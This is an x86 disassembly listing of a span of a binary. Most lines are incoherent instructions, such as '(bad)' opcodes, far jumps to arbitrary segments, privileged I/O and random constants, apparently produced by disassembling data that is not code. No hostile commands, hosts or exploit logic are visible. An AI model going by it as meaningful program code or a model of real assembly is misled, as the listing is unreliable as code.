  40682e:	arpl   WORD PTR [eax-0x54e5eadb],di
  406834:	jae    0x4068a8
  406836:	and    edi,DWORD PTR [esi]
  406838:	pop    eax
  406839:	call   0xdd5b:0x72835a78
  406840:	mov    es,esi
  406842:	jbe    0x40688a
  406844:	(bad)  
  406845:	ror    dl,cl
  406847:	ficomp WORD PTR [edi+0x2fd563a4]
  40684d:	pop    ss
  40684e:	addr16 mov cl,0x78
  406851:	jae    0x40683f
  406853:	jne    0x40680a
  406855:	lds    edx,FWORD PTR [ebp+0x58]
  406858:	and    eax,0xfdc99ff8
  40685d:	cld    
  40685e:	mov    ds:0x1d3c44e5,al
  406863:	sar    DWORD PTR [ecx],0x73
  406866:	mov    bh,0xa8
  406868:	push   edi
  406869:	mov    eax,0x5f467e27
  40686e:	or     DWORD PTR ds:[ecx],esi
  406871:	test   BYTE PTR [ecx],cl
  406873:	fild   DWORD PTR [esi]
  406875:	mov    al,ds:0x4472a0c5
  40687a:	js     0x40682a
  40687c:	push   0x3e
  40687e:	jmp    0x9e30:0xe62a6bea
  406885:	(bad)  
  406887:	add    edx,ebp
  406889:	(bad)  
  40688b:	hlt    
  40688c:	jb     0x406898
  40688e:	cld    
  40688f:	stos   DWORD PTR es:[edi],eax
  406890:	outs   dx,DWORD PTR ds:[esi]
  406891:	ss aas 
  406893:	imul   ebx,DWORD PTR [esi],0x3d9c0d3e
  406899:	dec    eax
  40689a:	ins    BYTE PTR es:[edi],dx
  40689b:	mov    bl,0x88
  40689d:	xor    BYTE PTR ds:0xbf50e886,ch
  4068a3:	mov    bl,0xc6
  4068a5:	adc    al,0xe7
  4068a7:	push   ss
  4068a8:	cmp    ebp,ecx
  4068aa:	icebp  
  4068ab:	jae    0x406907
  4068ad:	(bad)  
  4068ae:	iret   
  4068af:	pop    ebx
  4068b0:	test   eax,0x9f2abf89
  4068b5:	iret   
  4068b6:	adc    cl,BYTE PTR [ebx-0x5823dec7]
  4068bc:	ds gs push 0xffffffdb
  4068c0:	xor    ch,bl
  4068c2:	push   0xffffffed
  4068c4:	iret   
  4068c5:	cmp    al,0x3
  4068c7:	cdq    
  4068c8:	sti    
  4068c9:	inc    ebp
  4068ca:	mov    eax,DWORD PTR [eax]
  4068cc:	sbb    al,0xae
  4068ce:	mov    dl,BYTE PTR [esi]
  4068d0:	dec    esi
  4068d1:	loop   0x406861
  4068d3:	popf   
  4068d4:	xchg   edx,eax
  4068d5:	fisttp WORD PTR [eax]
  4068d7:	or     eax,0x94154030
  4068dc:	(bad)  
  4068dd:	mov    ecx,0x7cc8d030
  4068e2:	(bad)  
  4068e4:	mov    ch,0xfa
  4068e6:	rcl    bh,1
  4068e8:	mov    ebx,0x44d28de9
  4068ed:	cmp    al,0xaa
  4068ef:	and    DWORD PTR [edx],0xffffff8f
  4068f2:	adc    ebx,eax
  4068f4:	inc    esi
  4068f5:	sub    eax,0xf809b82a
  4068fa:	cli    
  4068fb:	sahf   
  4068fc:	mov    ecx,0x61483e80
  406901:	mov    BYTE PTR [edi],bl
  406903:	out    dx,al
  406904:	mov    bh,0x57
  406906:	dec    eax
  406907:	popf   
  406908:	mov    al,ds:0xd6172083
  40690d:	adc    DWORD PTR [esi+0x16],eax
  406910:	les    ebp,FWORD PTR cs:[edx]
  406913:	outs   dx,BYTE PTR ds:[esi]
  406914:	scas   al,BYTE PTR es:[edi]
  406915:	dec    edx
  406916:	cmovnp esp,DWORD PTR [esi+0x2c]
  40691a:	sbb    bl,BYTE PTR [edx+ebp*1+0x13537335]
  406921:	scas   eax,DWORD PTR es:[edi]
  406922:	fs cwde 
  406924:	and    BYTE PTR [ebx],ch
  406926:	sub    esi,ecx
  406928:	jae    0x406941
  40692a:	inc    esi
  40692b:	dec    ecx
  40692c:	xchg   esi,eax
  40692d:	fdivp  st(3),st
  40692f:	jge    0x406911
  406931:	fsubr  DWORD PTR [edi-0x33]
  406934:	ss ret 0x2b6c
  406938:	lea    ebp,[edx-0x6d381bcd]
  40693e:	pop    edx
  40693f:	cmc    
  406940:	jle    0x40693e
  406942:	mov    al,0x83
  406944:	pop    eax
  406945:	shld   DWORD PTR [ebx+eiz*1],edx,0x24
  40694a:	xor    DWORD PTR [ebx-0x38],0xf9964732
  406951:	nop
  406952:	mov    dl,bl
  406954:	jnp    0x406929
  406956:	mov    cl,0x95
  406958:	imul   ecx,DWORD PTR [eax],0xb53e2ffb
  40695e:	pop    ds
  40695f:	jno    0x40691f
  406961:	out    dx,al
  406962:	rol    esi,1
  406964:	add    ecx,ecx
  406966:	bound  eax,QWORD PTR [ecx+0x4f]
  406969:	xor    ebp,edi
  40696b:	pop    ecx
  40696c:	cs mov edx,0x90de65e3
  406972:	or     al,0x3d
  406974:	stos   BYTE PTR es:[edi],al
  406975:	xchg   ecx,eax
  406976:	pop    edi
  406977:	mov    edx,0x701c01b
  40697c:	fwait
  40697d:	mov    al,0xf0
  40697f:	fcomp  QWORD PTR [esi]
  406981:	adc    cl,cl
  406983:	aas    
  406984:	or     DWORD PTR [ebp+0xc],ecx
  406987:	mov    ds:0xb9abbf40,al
  40698c:	aad    0xd6
  40698e:	fsub   st(0),st
  406990:	sbb    dh,BYTE PTR [ebx]
  406992:	and    al,BYTE PTR [edi]
  406994:	es inc edi
  406996:	inc    esi
  406997:	sbb    edx,DWORD PTR [eax]
  406999:	mov    al,0x3f
  40699b:	(bad)  
  40699d:	(bad)  
  40699e:	nop
  40699f:	or     DWORD PTR [eax+0x3d738b70],esp
  4069a5:	jecxz  0x406980
  4069a7:	hlt    
  4069a8:	pop    esp
  4069a9:	in     eax,dx
  4069aa:	test   al,0x1c
  4069ac:	ror    BYTE PTR [edx],1
  4069ae:	jb     0x4069c9
  4069b0:	xchg   ebx,eax
  4069b1:	sar    DWORD PTR [ecx],cl
  4069b3:	dec    eax
  4069b4:	jl     0x40693f
  4069b6:	fdivr  st(5),st
  4069b8:	int3   
  4069b9:	fcom   QWORD PTR [edx-0x1547abbe]
  4069bf:	push   cs
  4069c0:	(bad)  
  4069c1:	xchg   edx,eax
  4069c2:	push   ss
  4069c3:	cmp    ch,dl
  4069c5:	mov    ch,0x66
  4069c7:	push   0x5c
  4069c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069ca:	jge    0x4069dc
  4069cc:	push   eax
  4069cd:	shr    DWORD PTR [ebp+0x76e0869c],0x3c
  4069d4:	push   edx
  4069d5:	fsub   DWORD PTR ds:0x4528b54a
  4069db:	and    dl,BYTE PTR [edi]
  4069dd:	pop    ds
  4069de:	jno    0x406a08
  4069e0:	or     BYTE PTR [ecx-0x5a],ah
  4069e3:	xor    DWORD PTR [eax-0x69],esi
  4069e6:	das    
  4069e7:	ins    DWORD PTR es:[edi],dx
  4069e8:	arpl   WORD PTR [ebp-0x3fda780f],bp
  4069ee:	fsubr  QWORD PTR [ebx]
  4069f0:	lahf   
  4069f1:	and    cl,BYTE PTR [esp+edi*4]
  4069f4:	mov    dl,ah
  4069f6:	mov    edi,0x25653488
  4069fb:	in     al,0x8a
  4069fd:	iret   
  4069fe:	pop    edi
  4069ff:	retf   0x16df
  406a02:	inc    ebp
  406a03:	jmp    0x4069d5
  406a05:	popa   
  406a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a07:	mov    ah,0x64
  406a09:	push   0x1e1a7f08
  406a0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a0f:	lods   eax,DWORD PTR ds:[esi]
  406a10:	xchg   DWORD PTR [ebx],esi
  406a12:	inc    ebp
  406a13:	loop   0x406a2f
  406a15:	push   edi
  406a16:	mov    eax,0x5fe9cb5a
  406a1b:	inc    esp
  406a1c:	mov    esp,0xa11465c8
  406a21:	in     eax,0xa6
  406a23:	sub    DWORD PTR [ebx],esp
  406a25:	fs xchg ecx,eax
  406a27:	or     BYTE PTR [edx],0xd0
  406a2a:	dec    esp
  406a2b:	pop    eax
  406a2c:	lods   eax,DWORD PTR ds:[esi]
  406a2d:	out    dx,eax
  406a2e:	mov    al,ds:0xa262f755
  406a33:	mov    dh,0x1f
  406a35:	in     al,0x59
  406a37:	add    al,0x29
  406a39:	mov    esi,0xb75cc2a8
  406a3e:	jecxz  0x406a86
  406a40:	cmc    
  406a41:	dec    edi
  406a42:	mov    BYTE PTR [esp+eiz*2-0x6c],ah
  406a46:	mov    edi,0x50d71822
  406a4b:	push   edx
  406a4c:	lock mov eax,0xba5977e4
  406a52:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a54:	push   esi
  406a55:	retf   0x80e0
  406a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a59:	leave  
  406a5a:	push   ebp
  406a5b:	xor    dh,dl
  406a5d:	xchg   DWORD PTR [esi-0x1d],esi
  406a60:	fld    DWORD PTR [edi]
  406a62:	loopne 0x406a72
  406a64:	xchg   ebx,eax
  406a65:	fmulp  st(7),st
  406a67:	das    
  406a68:	mov    edi,0xb8b954dc
  406a6d:	and    al,0x4c
  406a6f:	adc    al,BYTE PTR [esp+eax*2-0x1eb8c683]
  406a76:	mov    al,ds:0xb5f02df0
  406a7b:	cdq    
  406a7c:	xchg   ah,cl
  406a7e:	nop
  406a7f:	lds    edx,FWORD PTR [esi]
  406a81:	mov    eax,ds:0xad2b8e29
  406a86:	outs   dx,DWORD PTR ds:[esi]
  406a87:	test   DWORD PTR [eax],ecx
  406a89:	and    BYTE PTR ds:0x84ed4cc7,cl
  406a8f:	retf   0x7a80
  406a92:	mov    cl,ch
  406a94:	(bad)  
  406a95:	xchg   esp,eax
  406a96:	addr16 test eax,0xf7a90a71
  406a9c:	pop    ebp
  406a9d:	adc    ebp,ecx
  406a9f:	push   0xfffffff2
  406aa1:	js     0x406a2a
  406aa3:	arpl   WORD PTR ds:0xebff665,ax
  406aa9:	inc    DWORD PTR [eax]
  406aab:	pop    esp
  406aac:	clc    
  406aad:	push   edx
  406aae:	fidivr DWORD PTR fs:[edi-0x5a8cd23e]
  406ab5:	inc    esi
  406ab6:	mov    al,ds:0xcace2578
  406abb:	xor    edx,edx
  406abd:	cmp    BYTE PTR [ecx+edx*4-0x6b4de2fc],bl
  406ac4:	sbb    al,0xc9
  406ac6:	cmp    BYTE PTR [ecx-0x59e3bc93],bh
  406acc:	outs   dx,BYTE PTR ds:[esi]
  406acd:	fst    DWORD PTR [ebp-0x1e]
  406ad0:	jmp    FWORD PTR [esp+edi*8]
  406ad3:	ja     0x406ad0
  406ad5:	pop    esi
  406ad6:	not    DWORD PTR [ebx-0x35]
  406ad9:	push   esi
  406ada:	fsubrp st(2),st
  406adc:	add    DWORD PTR ds:0xac8170f1,ebp
  406ae2:	aad    0x94
  406ae4:	ret    0x6f0e
  406ae7:	push   eax
  406ae8:	pop    eax
  406ae9:	sti    
  406aea:	outs   dx,DWORD PTR ds:[esi]
  406aeb:	mov    al,0x92
  406aed:	adc    BYTE PTR [ebx-0x1751f57c],bh
  406af3:	popa   
  406af4:	sbb    eax,0x31ae2128
  406af9:	jo     0x406acc
  406afb:	or     DWORD PTR es:[ebx+0x26caab0b],eax
  406b02:	mov    bl,BYTE PTR [eax*1+0x3b9f4e34]
  406b09:	sbb    al,0xe5
  406b0b:	mov    eax,0xdceed0b7
  406b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b11:	(bad)  
  406b12:	(bad)  
  406b13:	jb     0x406aa9
  406b15:	ins    BYTE PTR es:[edi],dx
  406b16:	test   DWORD PTR [ebx-0x775ad30e],esp
  406b1c:	jb     0x406b92
  406b1e:	nop
  406b1f:	mov    bh,0x21
  406b21:	mov    DWORD PTR [ebp+0x4afec6e6],edx
  406b27:	imul   BYTE PTR [ebp+0x23]
  406b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b2b:	mov    al,0x57
  406b2d:	call   ebp
  406b2f:	mov    edi,DWORD PTR [esi-0xca5bd63]
  406b35:	jbe    0x406b4f
  406b37:	mov    dh,0xe5
  406b39:	mov    ebx,0x7debc725
  406b3e:	sub    al,BYTE PTR [edi]
  406b40:	rol    BYTE PTR [edi-0x25ff44ec],cl
  406b46:	push   0xcd4c70b3
  406b4b:	sar    DWORD PTR [ecx+edi*1],cl
  406b4e:	xchg   esi,eax
  406b4f:	sub    dl,BYTE PTR [ebx-0x75119103]
  406b55:	fs xchg ebp,eax
  406b57:	pushf  
  406b58:	xchg   BYTE PTR [esi+0x25],ch
  406b5b:	fmul   st,st(7)
  406b5d:	repnz loope 0x406b26
  406b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b61:	fsubr  QWORD PTR [edi+0x35]
  406b64:	adc    DWORD PTR [ebx],0x34128801
  406b6a:	xor    edi,ecx
  406b6c:	repnz or BYTE PTR [ebx],bl
  406b6f:	and    al,0x57
  406b71:	push   eax
  406b72:	pop    ebp
  406b73:	ret    0xe60
  406b76:	lock sub al,0xb1
  406b79:	mov    esi,0x839cad3b
  406b7e:	dec    edx
  406b7f:	jmp    0x9e31:0x1bec7daa
  406b86:	ret    0xa9d8
  406b89:	and    al,BYTE PTR [ebp+0x58fafee6]
  406b8f:	pop    esp
  406b90:	ds sbb bl,bh
  406b93:	ins    BYTE PTR es:[edi],dx
  406b94:	add    ebp,DWORD PTR [edi+ecx*2]
  406b97:	dec    ebx
  406b98:	jno    0x406bc6
  406b9a:	fild   WORD PTR [ebx-0x79]
  406b9d:	sahf   
  406b9e:	loop   0x406b31
  406ba0:	xchg   edx,eax
  406ba1:	and    DWORD PTR [esi],ecx
  406ba3:	mov    eax,ds:0x5c8ad4e2
  406ba8:	(bad)  
  406ba9:	push   0xffffff8b
  406bab:	sbb    al,0x18
  406bad:	push   ss
  406bae:	test   al,0x83
  406bb0:	jp     0x406b51
  406bb2:	and    ebx,DWORD PTR [edi+0x4a]
  406bb5:	or     dl,0x8f
  406bb8:	mov    ebx,0xefd2ce83
  406bbd:	popf   
  406bbe:	(bad)  
  406bbf:	(bad)  
  406bc0:	pushf  
  406bc1:	jne    0x406c3d
  406bc3:	fsubrp st(2),st
  406bc5:	test   eax,0x95b0ff83
  406bca:	xchg   edi,eax
  406bcb:	add    al,0x5c
  406bcd:	ret    
  406bce:	xchg   ebp,eax
  406bcf:	call   0x9c6c85ec
  406bd4:	test   edx,eax
  406bd6:	jnp    0x406c21
  406bd8:	and    al,0xe8
  406bda:	fwait
  406bdb:	neg    BYTE PTR ds:0x90004e7b
  406be1:	push   ebp
  406be2:	push   edx
  406be3:	int    0xf
  406be5:	jno    0x406b71
  406be7:	(bad)  
  406be8:	sbb    DWORD PTR [ecx-0x56d0f136],ebx
  406bee:	test   eax,0x65378f45
  406bf3:	jnp    0x406c5c
  406bf5:	pop    ebp
  406bf6:	fsubrp st(7),st
  406bf8:	imul   ebx,DWORD PTR [esi-0x23],0xffffff93
  406bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bfd:	push   es
  406bfe:	fnstcw WORD PTR [eax-0x3a]
  406c01:	or     ch,cl
  406c03:	xchg   edx,eax
  406c04:	lea    eax,[ebp+0x6b]
  406c07:	ret    0x5bc8
  406c0a:	xchg   esi,eax
  406c0b:	sub    DWORD PTR [ebp-0x64],esi
  406c0e:	inc    ebx
  406c0f:	stos   BYTE PTR es:[edi],al
  406c10:	loopne 0x406c3a
  406c12:	test   al,0xd2
  406c14:	out    dx,eax
  406c15:	(bad)  
  406c16:	mov    dl,0x24
  406c18:	es arpl cx,bx
  406c1b:	cmp    DWORD PTR [edx+0x3ca9e607],0xffffffcd
  406c22:	xor    al,0x64
  406c24:	aad    0xc3
  406c26:	or     DWORD PTR [eax-0x206b6198],ebx
  406c2c:	clc    
  406c2d:	cdq    
  406c2e:	sbb    DWORD PTR [ebp-0x21],edi
  406c31:	daa    
  406c32:	dec    esp
  406c33:	jp     0x406c94
  406c35:	jg     0x406cb6
  406c37:	imul   edx,esi,0xfffffff3
  406c3a:	push   ds
  406c3b:	mov    ds:0x2ef83d96,eax
  406c40:	xchg   esp,eax
  406c41:	xor    BYTE PTR [ecx],bl
  406c43:	jl     0x406c08
  406c45:	mov    ds:0x4311b6e8,eax
  406c4a:	jae    0x406c90
  406c4c:	xchg   ebx,eax
  406c4d:	cli    
  406c4e:	and    DWORD PTR [edx+0x2e],edx
  406c51:	in     al,dx
  406c52:	test   eax,0x36584dc
  406c57:	add    BYTE PTR [ebp+ecx*4-0x41e7dddb],ch
  406c5e:	add    eax,0xe9b90cd5
  406c63:	ins    BYTE PTR es:[edi],dx
  406c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c65:	outs   dx,DWORD PTR es:[esi]
  406c67:	jmp    0x87fc6497
  406c6c:	std    
  406c6d:	or     cl,BYTE PTR [edx-0x3477289a]
  406c73:	cmp    al,BYTE PTR [eax+0x55]
  406c76:	adc    bl,BYTE PTR [edi]
  406c78:	stos   DWORD PTR es:[edi],eax
  406c79:	push   ebp
  406c7a:	jmp    0x48d3d945
  406c7f:	inc    ecx
  406c80:	dec    esi
  406c81:	cmc    
  406c82:	sub    BYTE PTR [ebx],ah
  406c84:	mov    al,ds:0xc46c0543
  406c89:	jbe    0x406c3f
  406c8b:	popf   
  406c8c:	dec    edx
  406c8d:	xlat   BYTE PTR ds:[ebx]
  406c8e:	rcl    DWORD PTR [esi+0x142f66fe],1
  406c94:	xor    DWORD PTR [edx+0x36],ebx
  406c97:	outs   dx,DWORD PTR ds:[esi]
  406c98:	adc    dh,BYTE PTR [ebx]
  406c9a:	xchg   edi,eax
  406c9b:	mov    al,ds:0xdc265505
  406ca0:	(bad)  
  406ca1:	mov    WORD PTR [eax],es
  406ca3:	or     BYTE PTR [esi+ebp*4],bh
  406ca6:	fptan  
  406ca8:	test   eax,0xb940a61c
  406cad:	pop    ecx
  406cae:	test   eax,0x8943658a
  406cb3:	scas   eax,DWORD PTR es:[edi]
  406cb4:	iret   
  406cb5:	inc    edi
  406cb6:	retf   0x73dc
  406cb9:	ins    BYTE PTR es:[edi],dx
  406cba:	jl     0x406d00
  406cbc:	sbb    DWORD PTR [ebx+0x5e2bc3d4],0xffffffa5
  406cc3:	popa   
  406cc4:	adc    eax,edx
  406cc6:	sbb    al,0xad
  406cc8:	jmp    0xb6f5947f
  406ccd:	adc    al,0x90
  406ccf:	in     eax,0x76
  406cd1:	rcr    ecx,0x9b
  406cd4:	push   esi
  406cd5:	sub    edx,eax
  406cd7:	div    DWORD PTR [ebx+eax*2+0x35058575]
  406cde:	retf   
  406cdf:	jo     0x406d27
  406ce1:	mov    eax,0x8d0b381
  406ce6:	ds push eax
  406ce8:	in     al,0xd9
  406cea:	push   ss
  406ceb:	sbb    esi,ecx
  406ced:	sub    esi,ecx
  406cef:	repz call 0x7dc8bfe0
  406cf5:	dec    esi
  406cf6:	repz pop ds
  406cf8:	cdq    
  406cf9:	ret    
  406cfa:	and    BYTE PTR ds:0x9b8842c2,ch
  406d00:	jns    0x406cca
  406d02:	frstor [esi+ecx*4-0x34]
  406d06:	(bad)  
  406d07:	out    dx,eax
  406d08:	jne    0x406caf
  406d0a:	ds push es
  406d0c:	xchg   ebx,eax
  406d0d:	xor    DWORD PTR [esi],eax
  406d0f:	xchg   edx,eax
  406d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d11:	mov    bl,0x85
  406d13:	ret    
  406d14:	mov    dl,0xcb
  406d16:	pop    edx
  406d17:	jo     0x406caa
  406d19:	jle    0x406d35
  406d1b:	lea    esp,[esp+ecx*2+0x41]
  406d1f:	enter  0xd3a1,0x2a
  406d23:	jle    0x406cfa
  406d25:	rcl    edi,0x45
  406d28:	stc    
  406d29:	inc    esi
  406d2a:	daa    
  406d2b:	dec    ecx
  406d2c:	add    al,0x77
  406d2e:	or     al,0x2f
  406d30:	push   esp
  406d31:	ror    BYTE PTR ds:0x76667e3c,1
  406d37:	outs   dx,BYTE PTR ds:[esi]
  406d38:	les    esp,FWORD PTR [ebx-0x17cd2d12]
  406d3e:	lea    edx,[ebx+0x1d0cd50e]
  406d44:	pop    esp
  406d45:	retf   
  406d46:	cmp    BYTE PTR [edi+eiz*8-0x65],0x8f
  406d4b:	leave  
  406d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d4d:	nop
  406d4e:	jae    0x406d49
  406d50:	xchg   DWORD PTR [esi-0x4bc31f5],esp
  406d56:	sub    DWORD PTR [edx-0x1d],ebp
  406d59:	mul    BYTE PTR [edx]
  406d5b:	sub    ax,0xe547
  406d5f:	adc    eax,0xce55f866
  406d64:	jne    0x406d72
  406d66:	mov    WORD PTR [ebp-0x4c6a8202],cs
  406d6c:	jb     0x406d14
  406d6e:	jae    0x406d8d
  406d70:	clc    
  406d71:	adc    bh,cl
  406d73:	sub    BYTE PTR [esi-0x79b8b257],ah
  406d79:	or     DWORD PTR [ecx+0x1a],ebx
  406d7c:	mov    ch,0x31
  406d7e:	push   edx
  406d7f:	stos   BYTE PTR es:[edi],al
  406d80:	mov    dl,0xfb
  406d82:	jmp    0xe5b02fb8
  406d87:	rcl    BYTE PTR [edx+ebp*2-0x58f92f33],1
  406d8e:	inc    esp
  406d8f:	push   0x33
  406d91:	stos   DWORD PTR es:[edi],eax
  406d92:	xchg   ebx,eax
  406d93:	lea    edx,cs:[ecx]
  406d96:	ficom  WORD PTR [esi+ebx*4+0x59323b62]
  406d9d:	clc    
  406d9e:	sub    al,BYTE PTR [esi]
  406da0:	jecxz  0x406e0f
  406da2:	dec    ebp
  406da3:	push   ecx
  406da4:	mov    ds:0x87dec273,al
  406da9:	dec    edx
  406daa:	ja     0x406d40
  406dac:	dec    esp
  406dad:	jecxz  0x406de7
  406daf:	push   esi
  406db0:	jecxz  0x406d63
  406db2:	lock popa 
  406db4:	or     DWORD PTR [ebp-0x4],0xffffffa5
  406db8:	dec    edi
  406db9:	jecxz  0x406d57
  406dbb:	mov    dl,0x91
  406dbd:	test   BYTE PTR [eax],ah
  406dbf:	fadd   DWORD PTR [eax]
  406dc1:	jmp    0xeec:0x12eeee65
  406dc8:	xchg   edx,eax
  406dc9:	std    
  406dca:	mov    eax,ds:0x4987b97
  406dcf:	mov    cl,BYTE PTR [ebx+0x60]
  406dd2:	mov    esp,0x30a06a43
  406dd7:	xor    eax,0x2946ce84
  406ddc:	stos   BYTE PTR es:[edi],al
  406ddd:	stc    
  406dde:	pop    esp
  406ddf:	leave  
  406de0:	or     esi,DWORD PTR [ecx+0x530a1713]
  406de6:	sub    bh,dl
  406de8:	dec    eax
  406de9:	mov    edi,0x1c00dc0b
  406dee:	or     BYTE PTR [esi-0x3d],ch
  406df1:	ins    DWORD PTR es:[edi],dx
  406df2:	inc    eax
  406df3:	lods   al,BYTE PTR ds:[esi]
  406df4:	cmc    
  406df5:	and    BYTE PTR [ebp+ecx*1-0x24aa69d5],ch
  406dfc:	cmc    
  406dfd:	adc    dl,BYTE PTR [esi-0x60f15dc3]
  406e03:	test   al,0x97
  406e05:	or     DWORD PTR [eax-0x168b7c19],edi
  406e0b:	push   edi
  406e0c:	aad    0x18
  406e0e:	test   eax,0x13436389
  406e13:	dec    esi
  406e14:	fs loope 0x406e26
  406e17:	mov    BYTE PTR [ebp+0x30],al
  406e1a:	lds    ebp,FWORD PTR [eax]
  406e1c:	mov    dh,0xe9
  406e1e:	push   edx
  406e1f:	shr    DWORD PTR [edx],0xbc
  406e22:	sbb    ah,BYTE PTR [esp+eax*2-0x43]
  406e26:	mov    edx,0xc54a206e
  406e2b:	inc    ecx
  406e2c:	mov    cl,0x46
  406e2e:	jmp    0x406dc2
  406e30:	call   FWORD PTR [ebx+0x774cbe76]
  406e36:	lds    ecx,FWORD PTR [edi+0x17]
  406e39:	sub    ch,bl
  406e3b:	dec    edx
  406e3c:	out    0x14,al
  406e3e:	int3   
  406e3f:	mov    dh,0xa
  406e41:	aaa    
  406e42:	cdq    
  406e43:	xchg   edx,eax
  406e44:	mov    edi,0x86868934
  406e49:	sahf   
  406e4a:	jne    0x406ebc
  406e4c:	adc    BYTE PTR [ebx+0x70190e13],cl
  406e52:	add    DWORD PTR [ebx+edi*8+0x5a],edx
  406e56:	jnp    0x406ec0
  406e58:	inc    edi
  406e59:	push   edi
  406e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e5b:	mov    bh,0xd2
  406e5d:	sub    DWORD PTR [esi-0x1d512399],edx
  406e63:	ret    
  406e64:	test   DWORD PTR ds:0x6c094e25,esi
  406e6a:	add    ebp,DWORD PTR [ecx-0x5a575f9b]
  406e70:	inc    ebp
  406e71:	mov    cl,0x80
  406e73:	scas   al,BYTE PTR es:[edi]
  406e74:	arpl   WORD PTR [ecx],bx
  406e76:	xchg   edx,eax
  406e77:	jecxz  0x406eed
  406e79:	pop    ebp
  406e7a:	loopne 0x406e30
  406e7c:	cmp    BYTE PTR ds:0x5072d4a9,0x9c
  406e83:	rcl    DWORD PTR [ebp-0x1a],cl
  406e86:	dec    ecx
  406e87:	jae    0x406f07
  406e89:	scas   eax,DWORD PTR es:[edi]
  406e8a:	rcr    BYTE PTR [ebx],cl
  406e8c:	xchg   esi,eax
  406e8d:	xchg   BYTE PTR [eax-0x18a6426c],bh
  406e93:	xor    eax,0x5c0a1580
  406e98:	inc    ecx
  406e99:	jbe    0x406e8a
  406e9b:	ss inc eax
  406e9d:	xchg   edi,eax
  406e9e:	cmp    dh,BYTE PTR [edi+0x1d]
  406ea1:	out    dx,al
  406ea2:	sti    
  406ea3:	aas    
  406ea4:	in     eax,dx
  406ea5:	ret    0xfb35
  406ea8:	xor    esp,0x45ffa918
  406eae:	lds    edx,FWORD PTR [ebx+0x1c]
  406eb1:	pop    eax
  406eb2:	push   ebx
  406eb3:	mov    bh,0xb1
  406eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eb6:	(bad)  
  406eb7:	push   ecx
  406eb8:	mov    ebx,DWORD PTR [ecx-0x15]
  406ebb:	outs   dx,DWORD PTR ds:[esi]
  406ebc:	push   esi
  406ebd:	mov    eax,ds:0xfa7dd03f
  406ec2:	(bad)  
  406ec3:	fs inc ebp
  406ec5:	dec    edi
  406ec6:	nop
  406ec7:	inc    esi
  406ec8:	sbb    ah,ch
  406eca:	div    BYTE PTR [ecx+0x14d95723]
  406ed0:	push   edi
  406ed1:	imul   ebx,DWORD PTR [edi+0x4c931209],0x2
  406ed8:	jp     0x406f07
  406eda:	cmp    esp,DWORD PTR [eax]
  406edc:	pop    ebx
  406edd:	sbb    DWORD PTR [edi],eax
  406edf:	add    edi,esi
  406ee1:	dec    ecx
  406ee2:	sbb    eax,ebx
  406ee4:	call   0xefaa:0xc8139a86
  406eeb:	pop    ebp
  406eec:	mov    ebp,0x6abb82b5
  406ef1:	jne    0x406ef0
  406ef3:	rcr    edi,1
  406ef5:	mov    dl,0x19
  406ef7:	dec    eax
  406ef8:	mov    eax,ds:0x68002328
  406efd:	jle    0x406f42
  406eff:	nop
  406f00:	shl    DWORD PTR [eax+edi*1+0x1e],0x9e
  406f05:	rol    BYTE PTR [ebx+0x316af1aa],0x4
  406f0c:	sahf   
  406f0d:	jmp    0x51b83b2a
  406f12:	inc    ebx
  406f13:	mov    ch,0xd2
  406f15:	mov    edx,0xd558cd21
  406f1a:	mul    esi
  406f1c:	mov    edi,ecx
  406f1e:	jne    0x406f7a
  406f20:	scas   eax,DWORD PTR es:[edi]
  406f21:	cli    
  406f22:	sub    al,dh
  406f24:	sar    BYTE PTR ds:0xa74b9667,1
  406f2a:	scas   eax,DWORD PTR es:[edi]
  406f2b:	sbb    eax,0x4cb0de0f
  406f30:	ret    
  406f31:	int3   
  406f32:	stos   BYTE PTR es:[edi],al
  406f33:	push   esi
  406f34:	fs aam 0x84
  406f37:	bound  edi,QWORD PTR [esi-0x68]
  406f3a:	retf   0x2f51
  406f3d:	and    bh,al
  406f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f40:	inc    ebx
  406f41:	fadd   DWORD PTR ds:0x5d0459bf
  406f47:	loopne 0x406ec9
  406f49:	push   ebx
  406f4a:	rol    BYTE PTR [edx+ebx*4+0x2c28b24c],1
  406f51:	push   es
  406f52:	nop
  406f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f54:	cli    
  406f55:	test   BYTE PTR [eax],al
  406f57:	mov    BYTE PTR [esi],dh
  406f59:	mov    DWORD PTR fs:[esi],edi
  406f5c:	mov    ebx,0xd8df867b
  406f61:	sub    eax,0xea08dc33
  406f66:	stc    
  406f67:	rol    ebp,0xfe
  406f6a:	fmulp  st(2),st
  406f6c:	inc    esp
  406f6d:	xor    BYTE PTR [ebx],cl
  406f6f:	xor    eax,DWORD PTR [edi]
  406f71:	sub    ebp,ecx
  406f73:	mov    bl,0x37
  406f75:	das    
  406f76:	and    DWORD PTR [ebx],eax
  406f78:	out    dx,al
  406f79:	icebp  
  406f7a:	ret    0x1db1
  406f7d:	mov    esi,ebp
  406f7f:	ror    DWORD PTR [edx],1
  406f81:	dec    edx
  406f82:	not    BYTE PTR [esi-0x53]
  406f85:	xchg   esp,eax
  406f86:	push   es
  406f87:	mov    ecx,eax
  406f89:	pop    DWORD PTR [edi+0x30]
  406f8c:	xchg   edi,eax
  406f8d:	cld    
  406f8e:	pop    eax
  406f8f:	xchg   ebp,eax
  406f90:	cli    
  406f91:	and    cl,bl
  406f93:	sbb    cl,BYTE PTR [edi+0x32]
  406f96:	or     bh,0x8a
  406f99:	mov    ebx,0x1e149ee1
  406f9e:	and    ch,cl
  406fa0:	cmc    
  406fa1:	outs   dx,BYTE PTR ds:[esi]
  406fa2:	or     DWORD PTR [ecx-0x60],0x6e
  406fa6:	or     eax,0xa11c1741
